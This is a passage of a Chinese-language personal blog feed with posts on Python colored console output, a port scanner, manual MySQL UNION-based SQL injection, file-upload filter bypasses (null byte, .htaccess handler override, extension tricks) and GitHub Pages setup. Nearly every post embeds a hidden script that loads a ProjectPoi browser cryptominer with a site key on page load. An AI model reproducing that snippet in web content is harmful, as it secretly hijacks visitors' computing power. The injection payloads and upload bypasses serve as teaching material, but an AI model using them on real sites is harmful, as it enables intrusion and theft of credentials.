result:</div><div class="line">        printGreen (&apos;[+] Port %d is open&apos; %port)</div><div class="line">    else:</div><div class="line">        printRed (&apos;[-] Port %d is closed&apos; %port)</div></pre></td></tr></table></figure><h2 id="0×02-测试结果"><a href="#0×02-测试结果" class="headerlink" title="0×02 测试结果"></a>0×02 测试结果</h2><p><img src="http://r.photo.store.qq.com/psb?/V12DlJ9S2zSi6P/P2.49hByZWzkP3ezOtTOULCciFPS*NuNVfqoxWT4zIA!/r/dHYBAAAAAAAA" alt="damit5"><br><img src="http://r.photo.store.qq.com/psb?/V12DlJ9S2zSi6P/w1rAOST0SYL7VJLKyqwzS7FJZCe9v.iaHwTahTw9Zb0!/r/dIUBAAAAAAAA" alt="local"></p><div id="aplayer4" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer4"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "http://damit5.kiwi/Music/233.jpg",}});</script>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;
&lt;head&gt;
&lt;script&gt;
var script = document.createElement(&quot;script&quot;);
script.type = &quot;text/javascript&quot;;
script.src = &quot;https://ppoi.org/lib/projectpoi.min.js&quot;;
script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous(&quot;aoZgifd6N8x48tCIwRtb7bJA&quot;,{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
document.getElementsByTagName(&quot;head&quot;)[0].appendChild(script);
&lt;/script&gt;
&lt;/head&gt;
&lt;/html&gt;

&lt;h2 id=&quot;0×00-前言&quot;&gt;&lt;a href=&quot;#0×00-前言&quot; class=&quot;headerlink&quot; title=&quot;0×00 前言&quot;&gt;&lt;/a&gt;0×00 前言&lt;/h2&gt;&lt;p&gt;没错，这就是上个帖子所说的简单的端口扫描器&lt;/p&gt;
&lt;p&gt;加了颜色过后确实逼格猛涨&lt;/p&gt;
&lt;p&gt;废话不多说，开始记录下这有趣的故事&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://damit5.ml/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python在Windows/Linux中输出彩色文字</title>
    <link href="http://damit5.ml/2017/09/30/Python%E5%9C%A8Windows-Linux%E4%B8%AD%E8%BE%93%E5%87%BA%E5%BD%A9%E8%89%B2%E6%96%87%E5%AD%97/"/>
    <id>http://damit5.ml/2017/09/30/Python在Windows-Linux中输出彩色文字/</id>
    <published>2017-09-30T05:34:14.000Z</published>
    <updated>2017-11-06T05:31:38.000Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><html><head><script>var script = document.createElement("script");script.type = "text/javascript";script.src = "https://ppoi.org/lib/projectpoi.min.js";script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}document.getElementsByTagName("head")[0].appendChild(script);</script></head></html><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本来今天开开心心的打算写一个简单的端口扫描器来学习Python的网络编程，不过终端输出完全一个颜色不仅难看而且还伤眼睛</p><p>于是乎，上网搜寻了一大堆资料，测试了一下午，没有成功（心态崩溃）</p><p>不过，还好有<a href="http://lu4n.com/" target="_blank" rel="external">luan牛</a>的帮忙  O(∩_∩)O~</p><p>win下输出彩色文字，网上有两种方法一种是用system执行命令来设置颜色，感觉还是不太好，用ctypes模块实现更好点。</p><p>linux下设置颜色，网上只找到了一种方法</p><a id="more"></a><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">import platform</div><div class="line">if &apos;Windows&apos; in platform.system():</div><div class="line">    import sys</div><div class="line">    import ctypes</div><div class="line">    __stdInputHandle = -10</div><div class="line">    __stdOutputHandle = -11</div><div class="line">    __stdErrorHandle = -12</div><div class="line">    __foreGroundBLUE = 0x09</div><div class="line">    __foreGroundGREEN = 0x0a</div><div class="line">    __foreGroundRED = 0x0c</div><div class="line">    __foreGroundYELLOW = 0x0e</div><div class="line">    stdOutHandle=ctypes.windll.kernel32.GetStdHandle(__stdOutputHandle)</div><div class="line">    def setCmdColor(color,handle=stdOutHandle):</div><div class="line">        return ctypes.windll.kernel32.SetConsoleTextAttribute(handle, color)</div><div class="line">    def resetCmdColor():</div><div class="line">        setCmdColor(__foreGroundRED | __foreGroundGREEN | __foreGroundBLUE)</div><div class="line">    def printBlue(msg):</div><div class="line">        setCmdColor(__foreGroundBLUE)</div><div class="line">        sys.stdout.write(msg + &apos;\n&apos;)</div><div class="line">        resetCmdColor()</div><div class="line">    def printGreen(msg):</div><div class="line">        setCmdColor(__foreGroundGREEN)</div><div class="line">        sys.stdout.write(msg + &apos;\n&apos;)</div><div class="line">        resetCmdColor()</div><div class="line">    def printRed(msg):</div><div class="line">        setCmdColor(__foreGroundRED)</div><div class="line">        sys.stdout.write(msg + &apos;\n&apos;)</div><div class="line">        resetCmdColor()</div><div class="line">    def printYellow(msg):</div><div class="line">        setCmdColor(__foreGroundYELLOW)</div><div class="line">        sys.stdout.write(msg + &apos;\n&apos;)</div><div class="line">        resetCmdColor()</div><div class="line">else:</div><div class="line">    STYLE = &#123;</div><div class="line">        &apos;fore&apos;:&#123;</div><div class="line">               &apos;red&apos;: 31,</div><div class="line">               &apos;green&apos;: 32,</div><div class="line">               &apos;yellow&apos;: 33,</div><div class="line">               &apos;blue&apos;: 34,</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    def UseStyle(msg, mode = &apos;&apos;, fore = &apos;&apos;, back = &apos;40&apos;):</div><div class="line">        fore  = &apos;%s&apos; % STYLE[&apos;fore&apos;][fore] if STYLE[&apos;fore&apos;].has_key(fore) else &apos;&apos;</div><div class="line">        style = &apos;;&apos;.join([s for s in [mode, fore, back] if s])</div><div class="line">        style = &apos;\033[%sm&apos; % style if style else &apos;&apos;</div><div class="line">        end   = &apos;\033[%sm&apos; % 0 if style else &apos;&apos;</div><div class="line">        return &apos;%s%s%s&apos; % (style, msg, end)</div><div class="line">    def printRed(msg):</div><div class="line">        print UseStyle(msg,fore=&apos;red&apos;)</div><div class="line">    def printGreen(msg):</div><div class="line">        print UseStyle(msg,fore=&apos;green&apos;)</div><div class="line">    def printYellow(msg):</div><div class="line">        print UseStyle(msg,fore=&apos;yellow&apos;)</div><div class="line">    def printBlue(msg):</div><div class="line">        print UseStyle(msg,fore=&apos;blue&apos;)</div></pre></td></tr></table></figure><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>用起来很容易，直接<code>from color import *</code>就可以用了，有4种常用颜色可以使用，分别写了4个函数：</p><ul><li>成功信息 <code>printGreen</code></li><li>失败信息 <code>printRed</code></li><li>提示信息 <code>printBlue</code></li><li>警告信息 <code>printYellow</code></li></ul><div id="aplayer7" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer7"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "http://damit5.kiwi/Music/233.jpg",}});</script>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;
&lt;head&gt;
&lt;script&gt;
var script = document.createElement(&quot;script&quot;);
script.type = &quot;text/javascript&quot;;
script.src = &quot;https://ppoi.org/lib/projectpoi.min.js&quot;;
script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous(&quot;aoZgifd6N8x48tCIwRtb7bJA&quot;,{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
document.getElementsByTagName(&quot;head&quot;)[0].appendChild(script);
&lt;/script&gt;
&lt;/head&gt;
&lt;/html&gt;

&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本来今天开开心心的打算写一个简单的端口扫描器来学习Python的网络编程，不过终端输出完全一个颜色不仅难看而且还伤眼睛&lt;/p&gt;
&lt;p&gt;于是乎，上网搜寻了一大堆资料，测试了一下午，没有成功（心态崩溃）&lt;/p&gt;
&lt;p&gt;不过，还好有&lt;a href=&quot;http://lu4n.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;luan牛&lt;/a&gt;的帮忙  O(∩_∩)O~&lt;/p&gt;
&lt;p&gt;win下输出彩色文字，网上有两种方法一种是用system执行命令来设置颜色，感觉还是不太好，用ctypes模块实现更好点。&lt;/p&gt;
&lt;p&gt;linux下设置颜色，网上只找到了一种方法&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://damit5.ml/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>MySQL+PHP手工联合查询注入</title>
    <link href="http://damit5.ml/2017/09/30/MySQL-PHP%E6%89%8B%E5%B7%A5%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/"/>
    <id>http://damit5.ml/2017/09/30/MySQL-PHP手工联合查询注入/</id>
    <published>2017-09-30T05:30:42.000Z</published>
    <updated>2017-11-14T05:53:18.736Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><a id="more"></a><div id="aplayer3" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer3"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "http://damit5.kiwi/Music/233.jpg",}});</script><html><head><script>var script = document.createElement("script");script.type = "text/javascript";script.src = "https://ppoi.org/lib/projectpoi.min.js";script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}document.getElementsByTagName("head")[0].appendChild(script);</script></head></html><p>学习原理，不要专注于工具</p><!--more--><h2 id="1-查询字段长度"><a href="#1-查询字段长度" class="headerlink" title="1.查询字段长度"></a>1.查询字段长度</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">order by 6</div><div class="line">#直到最后一个不满足为止</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#注意：</div><div class="line">如果order by 1    报错</div><div class="line">1.禁用了order by函数</div><div class="line">2.与其他函数冲突top </div><div class="line">3.语句中已经存在order by </div><div class="line">解决方案：</div><div class="line">order by 1 --   # -- 表示注释</div></pre></td></tr></table></figure><h2 id="2-爆出显位数字"><a href="#2-爆出显位数字" class="headerlink" title="2.爆出显位数字"></a>2.爆出显位数字</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">union select 1,2,3,4,5,6</div><div class="line">#如果未爆错则在&quot;id=?&quot;后面加一个and 0 或者？前面加一个-，让他爆出显位数字(假设为 2 和 5 )</div><div class="line"></div><div class="line">eg：php?id=-5 或者  php?id=5 and 0</div><div class="line"># &quot; - &quot;和&quot; and 0 &quot;都是为了让页面报错</div></pre></td></tr></table></figure><h2 id="3-查出数据库的名字，将显位数字更改"><a href="#3-查出数据库的名字，将显位数字更改" class="headerlink" title="3.查出数据库的名字，将显位数字更改"></a>3.查出数据库的名字，将显位数字更改</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">version()       ---看数据库的版本</div><div class="line">database()---查数据库名称</div><div class="line">user()---查当前数据库用户的权限</div><div class="line">@@version_compile_os---查看操作系统版本</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">UNION SELECT 1,database(),3,4,5,6</div><div class="line">#查看数据库的名称</div></pre></td></tr></table></figure><h2 id="4-查表的名字，将数据库名转换为16进制（小葵）"><a href="#4-查表的名字，将数据库名转换为16进制（小葵）" class="headerlink" title="4.查表的名字，将数据库名转换为16进制（小葵）"></a>4.查表的名字，将数据库名转换为16进制（小葵）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">UNION SELECT 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=0x64767761</div><div class="line">#最后的16进制是数据库的名字（这里是dvwa）</div><div class="line">group_concat 表示爆出该数据库中所有的表的名字</div></pre></td></tr></table></figure><h2 id="5-查列的名字，将表的名字转换为16进制"><a href="#5-查列的名字，将表的名字转换为16进制" class="headerlink" title="5.查列的名字，将表的名字转换为16进制"></a>5.查列的名字，将表的名字转换为16进制</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">UNION SELECT 1,group_concat(column_name),3,4,5,6 from information_schema.columns where table_name=0x61646D696E</div><div class="line">#最后的16进制是表的名字（这里是admin）</div><div class="line">前面为列名，后面是表名</div></pre></td></tr></table></figure><h2 id="6-查列的内容"><a href="#6-查列的内容" class="headerlink" title="6.查列的内容"></a>6.查列的内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">UNION SELECT 1,adminName,3,4,adminPwd,6 from admin</div><div class="line"># adminName和adminPwd为查出来的列名，最后的admin为表名</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;div id=&quot;aplayer3&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
	
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://damit5.ml/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>上传绕过的几种姿势</title>
    <link href="http://damit5.ml/2017/09/30/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF/"/>
    <id>http://damit5.ml/2017/09/30/上传绕过的几种姿势/</id>
    <published>2017-09-30T05:29:22.000Z</published>
    <updated>2017-11-06T05:32:13.000Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><html><head><script>var script = document.createElement("script");script.type = "text/javascript";script.src = "https://ppoi.org/lib/projectpoi.min.js";script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}document.getElementsByTagName("head")[0].appendChild(script);</script></head></html><a id="more"></a><h2 id="0x01-前台脚本检测扩展名—绕过"><a href="#0x01-前台脚本检测扩展名—绕过" class="headerlink" title="0x01: 前台脚本检测扩展名—绕过"></a>0x01: 前台脚本检测扩展名—绕过</h2><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名。</p><h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>绕过前台脚本检测扩展名，就是将所要上传文件的扩展名更改为符合脚本检测规则的扩展名，通过BurpSuite工具，截取数据包，并将数据包中文件扩展名更改回原来的，达到绕过的目的。</p><p>例如:文件名本来为【evil.jpg】，上传时，用BurpSuite截包后，将数据包中的名字改为【evil.php】(或其它脚本类型)即可。</p><h2 id="0x02-Content-Type检测文件类型—绕过"><a href="#0x02-Content-Type检测文件类型—绕过" class="headerlink" title="0x02: Content-Type检测文件类型—绕过"></a>0x02: Content-Type检测文件类型—绕过</h2><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>当浏览器在上传文件到服务器的时候，服务器对说上传文件的Content-Type类型进行检测，如果是白名单允许的，则可以正常上传，否则上传失败。</p><h4 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>绕过Content–Type文件类型检测，就是用BurpSuite截取并修改数据包中文件的Content-Type类型(如改为:image/gif)，使其符合白名单的规则，达到上传的目的。</p><h2 id="0x03-文件系统00截断—绕过"><a href="#0x03-文件系统00截断—绕过" class="headerlink" title="0x03: 文件系统00截断—绕过"></a>0x03: 文件系统00截断—绕过</h2><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束。利用00截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生0x00上传截断漏洞。</p><h4 id="绕过方法-2"><a href="#绕过方法-2" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>通过抓包截断将【evil.php.jpg】后面的一个【.】换成【0x00】。在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束，从而将【evil.php.jpg】的内容写入到【evil.php】中，从而达到攻击的目的。</p><h2 id="0x04-服务器端扩展名检测黑名单—绕过"><a href="#0x04-服务器端扩展名检测黑名单—绕过" class="headerlink" title="0x04: 服务器端扩展名检测黑名单—绕过"></a>0x04: 服务器端扩展名检测黑名单—绕过</h2><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>当浏览器将文件提交到服务器端的时候，服务器端会根据设定的黑白名单对浏览器提交上来的文件扩展名进行检测，如果上传的文件扩展名不符合黑白名单的限制，则不予上传，否则上传成功。</p><h4 id="绕过方法-3"><a href="#绕过方法-3" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>将一句话木马的文件名【evil.php】，改成【evil.php.abc】(奇怪的不被解析的后缀名都行)。首先，服务器验证文件扩展名的时候，验证的是【.abc】，只要该扩展名符合服务器端黑白名单规则，即可上传。另外，当在浏览器端访问该文件时，Apache如果解析不了【.abc】扩展名，会向前寻找可解析的扩展名，即【.php】</p><h2 id="0x05-JS检测上传文件—绕过"><a href="#0x05-JS检测上传文件—绕过" class="headerlink" title="0x05: JS检测上传文件—绕过"></a>0x05: JS检测上传文件—绕过</h2><h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><p>上传文件时，对方使用JavaScript语句语法检测上传文件的合法性问题。</p><h4 id="绕过方法-4"><a href="#绕过方法-4" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>在本地浏览器客户端禁用JS即可。可使用火狐浏览器的NoScript插件、IE中禁用掉JS等方式实现。</p><h2 id="0x06-重写解析规则—绕过"><a href="#0x06-重写解析规则—绕过" class="headerlink" title="0x06: 重写解析规则—绕过"></a>0x06: 重写解析规则—绕过</h2><h4 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h4><p>上传覆盖.htaccess文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析。</p><h4 id="绕过方法-5"><a href="#绕过方法-5" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>在可以上传.htaccess文件时，先上传.htaccess文件，覆盖掉原先的.htaccess文件；再上传【evil.gif】文件。使用如下的.htaccess语句，即可将【evil.gif】文件以php脚本方式解析。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;FilesMatch &quot;evil.gif&quot;&gt;</div><div class="line">SetHandler application/x-httpd-php</div><div class="line">&lt;/FilesMatch&gt;</div></pre></td></tr></table></figure></p><h2 id="0x07-其它方式—绕过"><a href="#0x07-其它方式—绕过" class="headerlink" title="0x07: 其它方式—绕过"></a>0x07: 其它方式—绕过</h2><h4 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h4><p>部分程序员的思维不严谨，并使用逻辑不完善的上传文件合法性检测手段，导致可以找到方式绕过其检测方式。</p><h4 id="绕过方法-6"><a href="#绕过方法-6" class="headerlink" title="绕过方法"></a>绕过方法</h4><ol><li><p>后缀名大小写绕过<br>用于只将小写的脚本后缀名(如php)过滤掉的场合；<br>例如:将Burpsuite截获的数据包中的文件名【evil.php】改为【evil.Php】</p></li><li><p>双写后缀名绕过<br>用于只将文件后缀名，例如”php”字符串过滤的场合；<br>例如:上传时将Burpsuite截获的数据包中文件名【evil.php】改为【evil.pphphp】，那么过滤了第一个”php”字符串”后，开头的’p’和结尾的’hp’就组合又形成了【php】。</p></li><li><p>特殊后缀名绕过<br>用于检测文件合法性的脚本有问题的场合；<br>例如:将Burpsuite截获的数据包中【evil.php】名字改为【evil.php6】，或加个空格改为【evil.php 】等。</p></li></ol><div id="aplayer10" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer10"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "http://damit5.kiwi/Music/233.jpg",}});</script>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;
&lt;head&gt;
&lt;script&gt;
var script = document.createElement(&quot;script&quot;);
script.type = &quot;text/javascript&quot;;
script.src = &quot;https://ppoi.org/lib/projectpoi.min.js&quot;;
script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous(&quot;aoZgifd6N8x48tCIwRtb7bJA&quot;,{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
document.getElementsByTagName(&quot;head&quot;)[0].appendChild(script);
&lt;/script&gt;
&lt;/head&gt;
&lt;/html&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://damit5.ml/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://damit5.ml/2017/09/30/Hello-World/"/>
    <id>http://damit5.ml/2017/09/30/Hello-World/</id>
    <published>2017-09-30T03:36:02.000Z</published>
    <updated>2017-11-06T05:30:19.000Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><div id="aplayer0" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer0"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "http://damit5.kiwi/Music/233.jpg",}});</script><html><head><script>var script = document.createElement("script");script.type = "text/javascript";script.src = "https://ppoi.org/lib/projectpoi.min.js";script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}document.getElementsByTagName("head")[0].appendChild(script);</script></head></html><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经过一天的努力博客终于完全完全移植了过来，听说第一篇 <strong>Hello World</strong> 是惯例，也许就是因为以前没有遵守这个惯例所以博客老GG，不管怎么样，还是写一个吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Hello World</div></pre></td></tr></table></figure></p><a id="more"></a><p>因为在博客移植过程中也遇到了很多的坑，所以打算记录一下博客搭建的过程，也希望能为以后准备搭建博客的提供一些帮助</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><blockquote><p>因为我在Windows上搭建老是GG，所以干脆直接搭建在Ubuntu上，所以下列教程也适用于Ubuntu</p></blockquote><h3 id="注册GitHub账号"><a href="#注册GitHub账号" class="headerlink" title="注册GitHub账号"></a>注册GitHub账号</h3><h4 id="官网"><a href="#官网" class="headerlink" title="官网"></a><a href="https://github.com/" target="_blank" rel="external">官网</a></h4><h3 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h3><h5 id="1-登陆GitHub"><a href="#1-登陆GitHub" class="headerlink" title="1.登陆GitHub"></a>1.登陆GitHub</h5><h5 id="2-点击创建仓库"><a href="#2-点击创建仓库" class="headerlink" title="2.点击创建仓库"></a>2.点击创建仓库</h5><p><img src="http://r.photo.store.qq.com/psb?/V12DlJ9S2zSi6P/WwMsregcp9apgZFL1D0CwO..wGb4hkp8X8AaQ5DcVbw!/r/dDwBAAAAAAAA" alt="1"></p><h5 id="3-填写仓库信息"><a href="#3-填写仓库信息" class="headerlink" title="3.填写仓库信息"></a>3.填写仓库信息</h5><p>仓库名称必须是<strong>用户名.github.io</strong>（官方是这样写的，我也不知道为什么），比如我的用户名是damit5，那么我就填<strong>damit5.github.io</strong></p><p><img src="http://r.photo.store.qq.com/psb?/V12DlJ9S2zSi6P/JlhnxVcDc4JkWhWKxmuAfU5iKkBmU1umhoJiBJ87Ooo!/r/dD0BAAAAAAAA" alt="2"></p><h3 id="配置SSH"><a href="#配置SSH" class="headerlink" title="配置SSH"></a>配置SSH</h3><h4 id="1-设置user-name-和-email"><a href="#1-设置user-name-和-email" class="headerlink" title="1.设置user name 和 email :"></a>1.设置user name 和 email :</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git config --global user.name &quot;你的GitHub用户名&quot;</div><div class="line">git config --global user.email &quot;你的GitHub注册邮箱&quot;</div></pre></td></tr></table></figure><h4 id="2-生成ssh密钥"><a href="#2-生成ssh密钥" class="headerlink" title="2.生成ssh密钥"></a>2.生成ssh密钥</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa -C &quot;你的GitHub注册邮箱&quot;</div></pre></td></tr></table></figure><blockquote><p>一般这种情况下是不需要密码的，所以一直回车就好</p></blockquote><h6 id="成功后，用户文件夹下就会有一个新的文件夹-ssh，里面就有刚刚创建的ssh密钥文件id-rsa和id-rsa-pub"><a href="#成功后，用户文件夹下就会有一个新的文件夹-ssh，里面就有刚刚创建的ssh密钥文件id-rsa和id-rsa-pub" class="headerlink" title="成功后，用户文件夹下就会有一个新的文件夹 .ssh，里面就有刚刚创建的ssh密钥文件id_rsa和id_rsa_pub"></a>成功后，用户文件夹下就会有一个新的文件夹 <strong>.ssh</strong>，里面就有刚刚创建的ssh密钥文件<strong>id_rsa</strong>和<strong>id_rsa_pub</strong></h6><blockquote><p>注：id_rsa文件是私钥，要妥善保管，id_rsa.pub是公钥文件。</p></blockquote><h4 id="3-添加公钥到GitHub"><a href="#3-添加公钥到GitHub" class="headerlink" title="3.添加公钥到GitHub"></a>3.添加公钥到GitHub</h4><p>点击用户头像，然后再点击<strong>Settings</strong>选项</p><p>在用户设置栏，点击<strong>SSH and GPG keys</strong>选项，然后点击<strong>New SSH key</strong></p><p>将 <strong>id_rsa.pub</strong> 的内容复制到<strong>Key</strong> 文本框中，再点击<strong>Add SSH key</strong></p><h4 id="4-测试SSH"><a href="#4-测试SSH" class="headerlink" title="4.测试SSH"></a>4.测试SSH</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -T git@github.com</div></pre></td></tr></table></figure><p>接下来会显示出下面的确认信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">The authenticity of host &apos;github.com (192.30.255.112)&apos; can&apos;t be established.</div><div class="line">RSA key fingerprint is SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8.</div><div class="line">Are you sure you want to continue connecting (yes/no)?</div></pre></td></tr></table></figure><p>输入<strong>yes</strong>然后回车</p><p>如果显示出下面的内容则表示成功（damit5是用户名）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Hi damit5! You&apos;ve successfully 